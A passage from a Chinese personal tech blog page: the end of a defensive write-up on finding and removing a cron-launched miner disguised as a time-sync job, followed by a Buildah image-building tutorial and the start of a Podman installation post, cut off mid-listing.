<p>看到了一个 <code>/root/.systemd-ntpdate</code> 同步时间的任务，我想直接忽略了，但是 jiewei 同学让我查看下这个文件，是不是真的仅仅是时间同步，于时就看了下，好嘛，差点被骗</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i12.png" title="i12">
<p>既然 <code>crontab -l</code> 都已经配置了，那肯定要检查下其他路径下的配置文件，比如 <code>/etc/cron.d</code> <code>/etc/cron.daily</code> 等路径，果然又发现了一个 <code>0systemd-ntpdate</code> </p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i13.png" title="i13">
<img src="/2019/10/25/记一次系统被入侵分析过程/i14.png" title="i14">
<p>脚本内容都是一样的，只是 sleep 的参数不同</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i15.png" title="i15">
<p>既然找到了启动方式，那么现在可以直接 kill 掉进程，并删除 crontab 配置了，fengli 同学想要看看这个进程做了啥，于是通过 <code>gcore</code> 来生成了 core dump 文件</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i16.png" title="i16">
<p>通过 <code>strings</code> 查看该 coredump 文件，来看看能找到什么有用的信息</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i17.png" title="i17">
<p>与公网服务器是通过 jsonrpc 发送请求的，但是请求信息被编码过，不知道具体是什么内容</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i18.png" title="i18">
<p>可以看到大量的 cpu 型号，应该是收集了这个节点的硬件信息</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i19.png" title="i19">
<p>配置了 SOCK 代理，估计还有访问国外地址的请求</p>
<img src="/2019/10/25/记一次系统被入侵分析过程/i20.png" title="i20">
<p>再就没看出什么了，清理掉相关进程信息，同时清理掉定时任务，收工。</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>但是想着通过 google 查一下连接的那个公网 IP，看看有没有其他受害者，果然，发现了一篇<a href="http://www.ishenping.com/ArtInfo/3753664.html" target="_blank" rel="noopener">博客</a> 也写了一个分析过程，整体分析流程类似。</p>
<p>同时发现了360 在今年写的一篇<a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="noopener">博客</a> ，里面很详细的分析了这个入侵方式，通过什么方式入侵，有什么特征之类的，推荐阅读。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>当你的系统已经被别人入侵过了，那么你不要相信任何你看到的东西。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix" target="_blank" rel="noopener">https://unix.stackexchange.com/questions/196677/what-is-tmp-x11-unix</a> </li>
<li><a href="https://blog.netlab.360.com/systemdminer-propagation-through-ddg/" target="_blank" rel="noopener">https://blog.netlab.360.com/systemdminer-propagation-through-ddg/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/10/19/Buildah-初次体验/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/19/Buildah-初次体验/" itemprop="url">Buildah 初次体验</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-19T10:15:39+08:00">
                2019-10-19
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/19/Buildah-初次体验/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/19/Buildah-初次体验/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>上周体验了 <a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman</a> 来管理容器的构建、生命周期管理等。Podman 自身是可以通过 Dockerfile 来进行容器镜像的构建，并且也支持容器镜像的 pull/push/login 等操作，Buildah 能够带来什么好处，我们为什么要使用它？</p>
<p>容器工具体验系列：</p>
<ul>
<li><a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman 初次体验</a></li>
<li><a href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Buildah 初次体验</a></li>
<li><a href="https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/">Skopeo 初次体验</a></li>
</ul>
<p>注意：本文章所采用环境为 CentOS7，需要除了 Buildah 工具外，还需要安装 <code>containers-common</code> 用于配置容器。</p>
<h2 id="What"><a href="#What" class="headerlink" title="What"></a>What</h2><p>我们现在使用的容器管理工具无论是 Podman 还是 Docker，都是符合 OCI 规范的，他们操作的镜像也需要符合 OCI 规范，Buildah 介绍很简单： <code>A tool that facilitates building OCI images</code>。</p>
<p>Buildah 功能列表：</p>
<ol>
<li>创建容器</li>
<li>通过 Dockerfile 或者一个处于运行状态的容器（指 Buildah 自身创建的容器，Podman 不可见</li>
<li>挂载/卸载镜像文件系统</li>
<li>使用更新后挂载的镜像文件系统作为文件系统层创建新的镜像</li>
<li>…</li>
</ol>
<h3 id="Buildah-与-Podman-的关系"><a href="#Buildah-与-Podman-的关系" class="headerlink" title="Buildah 与 Podman 的关系"></a>Buildah 与 Podman 的关系</h3><p>在官方说法中，Buildah 与 Podman 是相辅相成的关系，有很多共同点：它们都不需要 root 权限；都可以通过 Dockerfile 来构建容器镜像；都采用 fork-exec 模型；都不需要守护进程等等。 Buildah 主要的优势在于可以在没有 Doclerfiles 的情况下创建容器镜像，这也造成了从 Docker 切换到 Buildah 的用户使用成本会稍微高一些，因为部分概念发生了改变，主要有以下这些对比：</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Podman Behavior</th>
<th>Buildah Behavior</th>
</tr>
</thead>
<tbody>
<tr>
<td>build</td>
<td>Calls buildah bud</td>
<td>Provides the build-using-dockerfile (bud) command that emulates Docker’s build command.</td>
</tr>
<tr>
<td>commit</td>
<td>Commits a Podman container into a container image. Does not work on a Buildah container. Once committed the resulting image can be used by either Podman or Buildah.</td>
<td>Commits a Buildah container into a container image. Does not work on a Podman container. Once committed, the resulting image can be used by either Buildah or Podman.</td>
</tr>
<tr>
<td>mount</td>
<td>Mounts a Podman container. Does not work on a Buildah container.</td>
<td>Mounts a Buildah container. Does not work on a Podman container.</td>
</tr>
<tr>
<td>pull and push</td>
<td>Pull or push an image from a container image registry. Functionally the same as Buildah.</td>
<td>Pull or push an image from a container image registry. Functionally the same as Podman.</td>
</tr>
<tr>
<td>run</td>
<td>Run a process in a new container in the same manner as docker run.</td>
<td>Runs the container in the same way as the RUN command in a Dockerfile.</td>
</tr>
<tr>
<td>rm</td>
<td>Removes a Podman container. Does not work on a Buildah container.</td>
<td>Removes a Buildah container. Does not work on a Podman container.</td>
<td></td>
</tr>
<tr>
<td>rmi, images, tag</td>
<td>Equivalent on both projects.</td>
<td>Equivalent on both projects.</td>
</tr>
<tr>
<td>containers and ps</td>
<td>ps is used to list Podman containers. The containers command does not exist.</td>
<td>containers is used to list Buildah containers. The ps command does not exist.</td>
</tr>
</tbody>
</table>
<h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><h3 id="从-Dockerfile-构建镜像"><a href="#从-Dockerfile-构建镜像" class="headerlink" title="从 Dockerfile 构建镜像"></a>从 Dockerfile 构建镜像</h3><p>buildah 提供了 <code>build-using-dockerfile</code> 命令支持从 Dockerfile 构建镜像，命令等同于 <code>docker build</code> 与 <code>podman build</code>。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ cat Dockerfile  <span class="comment"># 编写 Dockerfile</span></span><br><span class="line">FROM centos</span><br><span class="line"></span><br><span class="line">MAINTAINER &lt;zdyxry@gmail.com&gt;</span><br><span class="line"></span><br><span class="line">CMD <span class="built_in">echo</span> <span class="string">"hello yiran"</span></span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah bud -t yiran . <span class="comment"># 使用 `bud` 命令构建镜像，等同于 `docker build`</span></span><br><span class="line">STEP 1: FROM centos</span><br><span class="line">STEP 2: MAINTAINER &lt;zdyxry@gmail.com&gt;</span><br><span class="line">STEP 3: CMD <span class="built_in">echo</span> <span class="string">"hello yiran"</span></span><br><span class="line">STEP 4: COMMIT yiran</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob 9e607bb861a7 skipped: already exists</span><br><span class="line">Copying blob 5f70bf18a086 skipped: already exists</span><br><span class="line">Copying config ebaeed04e2 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">ebaeed04e23610d304c74d1e3bc0c428162e6e7eac529dce1376d8b284604b85</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED              SIZE</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   3 seconds ago        227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago          227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman images <span class="comment"># 构建出来的镜像保存在 `/var/lib/containers/storage` ，因此 Podman 可以直接使用</span></span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED              SIZE</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   7 seconds ago        227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago          227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman run localhost/yiran:latest</span><br><span class="line">hello yiran</span><br></pre></td></tr></table></figure>
<h3 id="从容器中构建镜像"><a href="#从容器中构建镜像" class="headerlink" title="从容器中构建镜像"></a>从容器中构建镜像</h3><p>这是 Buildah 最常使用方式，<code>buildah</code> 配合 Host 的命令操作来达到简化镜像构建的目的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah from centos</span><br><span class="line">centos-working-container</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah run centos-working-container yum install httpd -y</span><br><span class="line">Complete!</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ <span class="built_in">echo</span> <span class="string">"Hi yiran"</span> &gt; index.html</span><br><span class="line">You have new mail.</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah copy centos-working-container index.html /var/www/html/index</span><br><span class="line">062e7183713e39f9788fe12ef40c298aa69e394df5ee9699aa6c136fb32f3144</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah config --entrypoint <span class="string">"/usr/sbin/httpd -DFOREGROUND"</span> centos-working-container      </span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah commit centos-working-container  yiran-httpd</span><br><span class="line">Getting image <span class="built_in">source</span> signatures</span><br><span class="line">Copying blob 9e607bb861a7 skipped: already exists</span><br><span class="line">Copying blob a6d6842abbd9 <span class="keyword">done</span></span><br><span class="line">Copying config daa1399f36 <span class="keyword">done</span></span><br><span class="line">Writing manifest to image destination</span><br><span class="line">Storing signatures</span><br><span class="line">bdaa1399f36944ff74e6fe20c5b346aece51f5edb9c47907027ac4d877ccf179c</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd      latest   daa1399f3694   7 seconds ago    277 MB</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   975b7fcdfccc   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   8cafad8a1ab0   15 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman images</span><br><span class="line">REPOSITORY                 TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd      latest   daa1399f3694   15 seconds ago   277 MB</span><br><span class="line">localhost/yiran            latest   ebaeed04e236   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   975b7fcdfccc   13 minutes ago   227 MB</span><br><span class="line">&lt;none&gt;                     &lt;none&gt;   8cafad8a1ab0   15 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos   latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ podman run -p 8080:80 localhost/yiran-httpd:latest</span><br><span class="line">AH00558: httpd: Could not reliably determine the server<span class="string">'s fully qualified domain name, using 10.88.0.5. Set the '</span>ServerName<span class="string">' directive globally to suppress this message</span></span><br></pre></td></tr></table></figure>
<p>上述操作解释如下：</p>
<ol>
<li><code>buildah from</code> 命令创建一个新的处于运行中的容器</li>
<li><code>buildah run &lt;container id&gt;</code> 在容器中执行命令</li>
<li><code>echo yiran &gt; index.html</code> 在主机上执行的命令，生成文件，该文件保存在主机上</li>
<li><code>buildah copy</code> 将主机上的文件拷贝到容器中，等同于 Dockerfile 中的 <code>COPY</code></li>
<li><code>buildah config --entrypoint</code> 给容器配置 entrypoint，等同于 Dockerfile 中的 <code>ENTRYPOINT</code></li>
<li><code>buildah commit</code> 将该容器制作为镜像，保存在 <code>/var/lib/containers/</code> 下</li>
</ol>
<h3 id="挂载镜像"><a href="#挂载镜像" class="headerlink" title="挂载镜像"></a>挂载镜像</h3><p>buildah 提供了 <code>buildah mount</code> 命令，可以将运行中容器挂载到 Host 的文件系统上，我们可以直接在 Host 上对容器内文件进行操作：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah images</span><br><span class="line">REPOSITORY                  TAG      IMAGE ID       CREATED          SIZE</span><br><span class="line">localhost/yiran-httpd       latest   daa1399f3694   25 minutes ago   277 MB</span><br><span class="line">localhost/yiran             latest   ebaeed04e236   39 minutes ago   227 MB</span><br><span class="line">docker.io/library/centos    latest   0f3e07c0138f   2 weeks ago      227 MB</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah from localhost/yiran-httpd</span><br><span class="line">yiran-httpd-working-container</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ buildah mount yiran-httpd-working-container</span><br><span class="line">/var/lib/containers/storage/overlay/75d42aaf05bfb855d59c7ae32ac138acd17c6a40f56cd541b16bffad6c720e9b/merged</span><br><span class="line">root@yiran-30-250:/tmp/buildah</span><br><span class="line"> $ cat /var/lib/containers/storage/overlay/75d42aaf05bfb855d59c7ae32ac138acd17c6a40f56cd541b16bffad6c720e9b/merged/var/www/html/index</span><br><span class="line">Hi yiran</span><br></pre></td></tr></table></figure>
<p>我们除了可以直接操作容器内文件，也可以在 Host 上给容器安装一些软件，如 dnf、make 等工具：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dnf install --installroot=&lt;container mountpoint&gt;</span><br><span class="line">make install DESTDIR=&lt;container mountpoint&gt;</span><br></pre></td></tr></table></figure>
<p>这里面临一个问题：如果在构建镜像的时候依赖于我们 Host 的环境，那么就无法达到我们想要的构建环境隔离了。这个问题可以通过使用多个容器共同构建来解决。</p>
<p>假设如果我们需要 gcc 环境，那么我们可以准备两个容器：其中一个包含 gcc ，并用它来编译，编译完成后在另一个纯净的容器中安装，最终只需要 commit 纯净的容器就可以。</p>
<p>这里的好处是 buildah 方式构建镜像，不会像 Dockerfile 一样包含很多层，只有执行 <code>buildah commit</code> 的时候产生一层镜像文件，我们也不需要考虑清理编译环境等问题。</p>
<h2 id="Why"><a href="#Why" class="headerlink" title="Why"></a>Why</h2><p>了解了基本的使用，那么我们需要知道为什么要使用 Buildah。</p>
<p>首先如果不使用 Buildah，对于整个容器工具链来说是完全 Ok 的，哪怕是不使用 Docker，仅凭 <code>podman build</code> 命令配合 Dockerfile 也是足够的，我们可以构建我们所需要的任意镜像。</p>
<p>使用 Buildah 能带来什么好处呢？我理解是我们可以通过更多的手段去构建镜像，不局限于 Dockerfile 中有限的关键字，我们有了更多的可能性，这就足够了。无论是 Buildah 原生命令还是通过 <code>buildah mount</code> 挂载到本地文件系统，都让我们可以更舒服的构建镜像，我们从维护一个 Dockerfile 转变为维护一个 Shell 脚本。</p>
<p>当然无论使用哪种方式，我们都需要知道 OCI 镜像标准是什么，这是最基本的。</p>
<p>Shell 脚本示例：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line"></span><br><span class="line">set -o errexit</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Create a container</span></span><br><span class="line">container=$(buildah from fedora:28)</span><br><span class="line">mountpoint=$(buildah mount $container)</span><br><span class="line"></span><br><span class="line">buildah config --label maintainer="yiran &lt;zdyxry@gmail.com&gt;" $container</span><br><span class="line"></span><br><span class="line">curl -sSL http://ftpmirror.gnu.org/hello/hello-2.10.tar.gz \</span><br><span class="line">     -o /tmp/hello-2.10.tar.gz</span><br><span class="line">tar xvzf src/hello-2.10.tar.gz -C $&#123;mountpoint&#125;/opt</span><br><span class="line"></span><br><span class="line">pushd $&#123;mountpoint&#125;/opt/hello-2.10</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install DESTDIR=$&#123;mountpoint&#125;</span><br><span class="line">popd</span><br><span class="line"></span><br><span class="line">chroot $mountpoint bash -c "/usr/local/bin/hello -v"</span><br><span class="line"></span><br><span class="line">buildah config --entrypoint "/usr/local/bin/hello" $container</span><br><span class="line">buildah commit --format docker $container hello</span><br><span class="line">buildah unmount $container</span><br></pre></td></tr></table></figure></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><a href="https://github.com/containers/buildah" target="_blank" rel="noopener">https://github.com/containers/buildah</a></li>
<li><a href="http://chris.collins.is/2017/08/17/buildah-a-new-way-to-build-container-images/" target="_blank" rel="noopener">http://chris.collins.is/2017/08/17/buildah-a-new-way-to-build-container-images/</a> </li>
<li><a href="https://developers.redhat.com/blog/2019/02/21/podman-and-buildah-for-docker-users/" target="_blank" rel="noopener">https://developers.redhat.com/blog/2019/02/21/podman-and-buildah-for-docker-users/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://zdyxry.github.io/2019/10/12/Podman-初次体验/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="yiran">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/yiran.png">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Yiran's Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/10/12/Podman-初次体验/" itemprop="url">Podman 初次体验</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-10-12T21:40:30+08:00">
                2019-10-12
              </time>
            

            

            
          </span>

          

          
            
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
                <a href="/2019/10/12/Podman-初次体验/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2019/10/12/Podman-初次体验/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>CentOS8 在9月24号正式 Release 了，比 RHEL8 要推迟了4个月。这次的更新感觉比 CentOS7 的更新要来的重要，内核更新到了4.x，网络管理彻底替换了 network.service，防火墙管理等等，还包括去除了 Docker 作为默认的容器化管理工具，使用 Podman、Buildah、Skopeo 进行了替换，这里来体验下 Podman。</p>
<p>容器工具体验系列：</p>
<ul>
<li><a href="https://zdyxry.github.io/2019/10/12/Podman-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Podman 初次体验</a></li>
<li><a href="https://zdyxry.github.io/2019/10/19/Buildah-%E5%88%9D%E6%AC%A1%E4%BD%93%E9%AA%8C/">Buildah 初次体验</a></li>
<li><a href="https://zdyxry.github.io/2019/10/26/Skopeo-初次体验/">Skopeo 初次体验</a></li>
</ul>
<p>本篇文章所有环境基于 CentOS8。</p>
<h2 id="Podman"><a href="#Podman" class="headerlink" title="Podman"></a>Podman</h2><p>为啥不用 Docker 了？我个人觉得 Docker 目前使用上最大的问题就是需要运行一个守护进程，虽然需要 root 用户也是一个问题，但是对于我个人来说还好。随着 K8S 定义 CRI 标准，且 Docker 的稳定性一直是个问题（虽然最近有在往好的趋势发展），但越来越多人使用 CRI-O 来替代 Docker，Docker 在被大家所抛弃（- - </p>
<p>Podman 创建的容器不需要守护进程，且可以用普通用户创建容器。Podman 中的大部分命令的使用方式与 Docker 相同，可以看左 <code>alias docker=podman</code> 。</p>
<p>Podman 的缺点：</p>
<ol>
<li>仅在 Linux 下支持，无法像 Docker 一样支持 Windows 和 MacOS</li>
<li>缺少 docker-compose 工具替代品，哪怕有 k8s Pod 概念（虽然有 <a href="https://github.com/containers/podman-compose" target="_blank" rel="noopener">podman-compose</a>，但是他还没有release 1.0版本，使用需谨慎</li>
<li>更新频繁（使用这类工具是有些心累的。。</li>
</ol>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>Podman 可以直接使用 <code>dnf</code> 继续安装，需要注意的是，在 CentOS 中 Podman 依赖于 containers-common，这里会附带很多配置信息到 <code>/etc/containers</code>，后续会用到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ sudo dnf install podman                      </span><br><span class="line">Last metadata expiration check: 0:03:31 ago on Wed 02 Oct 2019 11:57:25 AM CST.</span><br><span class="line">Package podman-1.0.0-2.git921f98f.module_el8.0.0+58+91b614e7.x86_64 is already installed.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">Nothing to <span class="keyword">do</span>.</span><br><span class="line">Complete!</span><br><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ dnf info podman        </span><br><span class="line">Installed Packages</span><br><span class="line">Name         : podman</span><br><span class="line">Version      : 1.0.0</span><br><span class="line">Release      : 2.git921f98f.module_el8.0.0+58+91b614e7</span><br><span class="line">Arch         : x86_64</span><br><span class="line">Size         : 37 M</span><br><span class="line">Source       : podman-1.0.0-2.git921f98f.module_el8.0.0+58+91b614e7.src.rpm</span><br><span class="line">Repo         : @System</span><br><span class="line">From repo    : AppStream</span><br><span class="line">Summary      : Manage Pods, Containers and Container Images</span><br><span class="line">URL          : https://github.com/containers/libpod</span><br><span class="line">License      : ASL 2.0</span><br><span class="line">Description  : Manage Pods, Containers and Container Images</span><br><span class="line">             : libpod provides a library <span class="keyword">for</span> applications looking to use</span><br><span class="line">             : the Container Pod concept popularized by Kubernetes.</span><br></pre></td></tr></table></figure>
<h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p>安装完成后，来看下 Podman RPM 中附带了些什么文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yiran@yiran-centos8:~ </span><br><span class="line"> $ rpm -ql podman  |grep -v <span class="string">'/usr/share/man/'</span>  <span class="comment"># 去除 man 手册中内容</span></span><br><span class="line">/etc/cni/net.d/87-podman-bridge.conflist</span><br><span class="line">/usr/bin/podman</span><br><span class="line">/usr/lib/.build-id</span><br><span class="line">/usr/lib/.build-id/37</span><br><span class="line">/usr/lib/.build-id/37/e7f04d352e5dbde603e9701baedb0b1be6bc37</span><br><span class="line">/usr/lib/.build-id/9a</span><br><span class="line">/usr/lib/.build-id/9a/2b43332ca5756f9e2a086bae9b953009ef5a37</span><br><span class="line">/usr/lib/systemd/system/io.podman.service</span><br><span class="line">/usr/lib/systemd/system/io.podman.socket</span><br><span class="line">/usr/lib/tmpfiles.d/podman.conf</span><br><span class="line">/usr/libexec/podman/conmon</span><br><span class="line">/usr/share/bash-completion/completions/podman</span><br><span 